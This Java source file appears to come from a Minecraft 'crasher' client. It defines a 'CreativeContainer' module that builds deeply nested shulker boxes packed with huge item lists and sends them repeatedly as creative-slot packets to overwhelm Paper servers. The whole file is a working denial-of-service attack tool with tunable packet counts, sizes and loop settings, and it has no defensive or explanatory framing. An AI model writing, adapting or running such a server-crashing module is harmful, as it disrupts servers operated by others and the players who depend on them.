package me.dannycrasher.client.module.impl.paper;

import com.viaversion.viafabricplus.ViaFabricPlus;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ScheduledExecutorService;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.protocol.components.data.DataComponents;
import me.dannycrasher.client.protocol.components.data.impl.DataContainer;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.components.objects.ItemType;

public class CreativeContainer extends Module {
	private ScheduledExecutorService executorService;

	public CreativeContainer() {
		super("CreativeContainer", "Paper creative-slot nested container bomb (requires creative)", ModuleType.PAPER);
		addArgument("packets", ArgumentType.INT, 1, 1000, "50");
		addArgument("size 1", ArgumentType.INT, 1, 2096000, "256");
		addArgument("size 2", ArgumentType.INT, 1, 2096000, "16");
		addArgument("slot", ArgumentType.INT, 0, 45, "36");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1000");
		addArgument("loopAmount", ArgumentType.INT, 1, 5000, "5");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int packets = context.getInt("packets");
		int size1 = context.getInt("size 1");
		int size2 = context.getInt("size 2");
		int slot = context.getInt("slot");
		int threadSleep = context.getInt("threadSleep");
		int loopAmount = context.getInt("loopAmount");

		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		int shulkerId = ItemType.SHULKER_BOX.getId(protocol);
		int fillerId = ItemType.STONE.getId(protocol);

		ItemStack leaf = new ItemStack(fillerId, 1, null);
		List<ItemStack> inner = new ArrayList<>(size1);
		for (int i = 0; i < size1; i++) {
			inner.add(leaf);
		}

		DataComponents innerComponents = new DataComponents();
		innerComponents.put(new DataContainer(inner));
		ItemStack nested = new ItemStack(shulkerId, 1, innerComponents);

		List<ItemStack> outer = new ArrayList<>(size2);
		for (int i = 0; i < size2; i++) {
			outer.add(nested);
		}

		DataComponents outerComponents = new DataComponents();
		outerComponents.put(new DataContainer(outer));
		ItemStack item = new ItemStack(shulkerId, 1, outerComponents);

		executorService = CreativeAttackHelper.start(this, context, executorService, packets, threadSleep, loopAmount, slot, item);
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		CreativeAttackHelper.shutdown(executorService);
	}
}
